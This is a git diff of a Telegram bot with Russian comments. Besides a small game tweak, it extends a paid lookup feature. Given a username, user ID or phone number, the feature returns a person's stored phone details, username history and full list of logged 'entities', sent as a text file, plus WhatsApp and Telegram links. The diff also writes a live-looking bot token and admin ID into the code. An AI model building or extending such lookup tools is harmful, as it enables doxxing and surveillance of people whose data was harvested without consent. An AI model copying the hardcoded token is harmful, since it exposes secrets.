@@ -8,13 +8,14 @@ from zoneinfo import ZoneInfo
 import phonenumbers
 import json
 import random
+import io
 import re
 import time
 import requests
 
 # === Настройки бота ===
-TOKEN = ""
-ADMIN_ID = 
+TOKEN = "8212352418:AAGPJ1Ng0v8AD1sYhdRrD6rCX2rtr7LOVeI"
+ADMIN_ID = 8295751364
 PASSWORD = 1213
 
 bot = telebot.TeleBot(TOKEN, parse_mode='HTML')
@@ -88,7 +89,8 @@ CREATE TABLE IF NOT EXISTS players (
     user_id INTEGER PRIMARY KEY,
     name TEXT,
     points INTEGER DEFAULT 0,
-    last_dep INTEGER DEFAULT 0
+    last_dep INTEGER DEFAULT 0,
+    got_muffdin INTEGER DEFAULT 0
 )
 """)
 
@@ -269,14 +271,35 @@ def log_user_info(message, contact=None):
     save_entities(message)  # <-- теперь обязательно сохраняем сущности
 
 
-def roll_item():
-    r = random.randint(1, sum(item["chance"] for item in items))
-    cumulative = 0
+def roll_item(user_id):
+    # Получаем информацию о пользователе
+    cursor.execute("SELECT got_muffdin FROM players WHERE user_id=?", (user_id,))
+    row = cursor.fetchone()
+    got_muffdin = row[0] if row else 0
+
+    # Составляем список доступных предметов
+    available_items = []
     for item in items:
+        # Если пользователь уже получил Mr.Muffdin, исключаем этот предмет
+        if item["emoji"] == "встретил Mr.Muffdin👾" and got_muffdin:
+            continue
+        available_items.append(item)
+
+    # Генерация случайного предмета по шансам
+    r = random.randint(1, sum(item["chance"] for item in available_items))
+    cumulative = 0
+    for item in available_items:
         cumulative += item["chance"]
         if r <= cumulative:
+            # Динамическая цена для некоторых предметов
             if item["emoji"] in ["нашёл 💳", "нашёл 📀 с биткоинами"]:
                 item["price"] = random.randint(0, 500) if item["emoji"] == "нашёл 💳" else random.randint(300, 500)
+
+            # Если выпал Mr.Muffdin, отмечаем пользователя
+            if item["emoji"] == "встретил Mr.Muffdin👾":
+                cursor.execute("UPDATE players SET got_muffdin = 1 WHERE user_id=?", (user_id,))
+                conn.commit()
+
             return item
 
 def get_player(user_id, name):
@@ -549,7 +572,7 @@ def dep(message):
     current_time = int(time.time())
 
     if current_time - last_dep >= 8 * 3600:
-        item = roll_item()
+        item = roll_item(user_id)  # передаём user_id для проверки Mr.Muffdin
         new_points = points + item["price"]
         update_player(user_id, new_points, current_time)
         bot.reply_to(message, f"{name}, ты {item['emoji']}{item['price']}ᛖ!\nТеперь у тебя {new_points}ᛖ!")
@@ -736,7 +759,6 @@ def get_user_info(message):
     user_id = message.from_user.id
     query = message.text.strip()
 
-    # Используем row_factory для удобного доступа к колонкам
     conn.row_factory = sqlite3.Row
     cur = conn.cursor()
 
@@ -749,6 +771,7 @@ def get_user_info(message):
         searches, unlimited = 0, 0
     else:
         searches, unlimited = row["searches"], row["unlimited"]
+
     if not unlimited and searches <= 0:
         bot.reply_to(message, "⚠ У вас закончились поисковые запросы!")
         return
@@ -764,7 +787,7 @@ def get_user_info(message):
         bot.reply_to(message, "⚠ Введите @username, ID или корректный номер телефона (например +79991234567).")
         return
 
-    # Ищем пользователя в базе
+    # Поиск пользователя
     if field == "phone_number":
         cur.execute("SELECT * FROM user_info WHERE phone_number=?", (value,))
     else:
@@ -806,12 +829,19 @@ def get_user_info(message):
 
     # Сущности пользователя
     entities_text = "—"
+    full_entities_text = "—"
     if uid != "—":
-        cur.execute("SELECT entity_type, entity_value, created_at FROM user_entities WHERE user_id=?", (uid,))
+        cur.execute(
+            "SELECT entity_type, entity_value, created_at FROM user_entities WHERE user_id=? ORDER BY created_at DESC",
+            (uid,)
+        )
         entities = cur.fetchall()
-        entities_text = "\n".join([f"{e['entity_type']}: {e['entity_value']} ({e['created_at']})" for e in entities]) or "—"
+        if entities:
+            last_10 = entities[:10]
+            entities_text = "\n".join(f"{e['entity_type']}: {e['entity_value']} ({e['created_at']})" for e in last_10)
+            full_entities_text = "\n".join(f"{e['entity_type']}: {e['entity_value']} ({e['created_at']})" for e in entities)
 
-    # Анализ телефона через phonenumbers
+    # Анализ телефона
     if phone != "—":
         analysis = analyze_phone_full(phone)
         phone_formatted = analysis.get("e164") or phone
@@ -844,25 +874,50 @@ def get_user_info(message):
 <b>UTC смещения:</b> {utc_str}
 
 <b>📜 История username:</b>
-<pre>{history_text}\n</pre>
-<b>🗂 Сущности пользователя:</b>
+<pre>{history_text}</pre>
+<b>🗂 Последние 10 сущностей пользователя:</b>
 <pre>{entities_text}</pre>
 """.strip()
 
     markup = types.InlineKeyboardMarkup(row_width=1)
 
-    # Кнопка WhatsApp для любого корректного номера
-    if phone and phone != "—":
+    # Кнопка WhatsApp
+    if phone != "—":
         wa_link = get_whatsapp_link(phone)
-        btn_whatsapp = types.InlineKeyboardButton("📱 Открыть WhatsApp", url=wa_link)
-        markup.add(btn_whatsapp)
+        markup.add(types.InlineKeyboardButton("📱 Открыть WhatsApp", url=wa_link))
+
+    # Кнопка Telegram
+    if uname != "—":
+        tg_link = f"https://t.me/{uname}"
+        markup.add(types.InlineKeyboardButton("💬 Открыть Telegram", url=tg_link))
 
     bot.send_message(chat_id, reply, reply_markup=markup)
+
+    # Отправка файла со всеми сущностями сразу
+    if full_entities_text != "—":
+        file_name = f"entities_{uid}.txt"
+        with open(file_name, "w", encoding="utf-8") as f:
+            f.write(full_entities_text)
+        with open(file_name, "rb") as f:
+            bot.send_document(chat_id, f, caption="📄 Все сущности пользователя")
 
     # Минус один поиск если не unlimited
     if not unlimited:
         cur.execute("UPDATE search_limits SET searches = searches - 1 WHERE user_id=?", (user_id,))
         conn.commit()
+
+
+# Отдельный обработчик callback для отправки файла
+@bot.callback_query_handler(func=lambda call: call.data.startswith("entities_file_"))
+def send_entities_file(call):
+    uid = call.data.split("_")[-1]
+    file_name = f"entities_{uid}.txt"
+    try:
+        with open(file_name, "rb") as f:
+            bot.send_document(call.message.chat.id, f)
+    except FileNotFoundError:
+        bot.send_message(call.message.chat.id, "❌ Файл со сущностями не найден.")
+
 
 # === Запуск бота ===
 bot.infinity_polling()
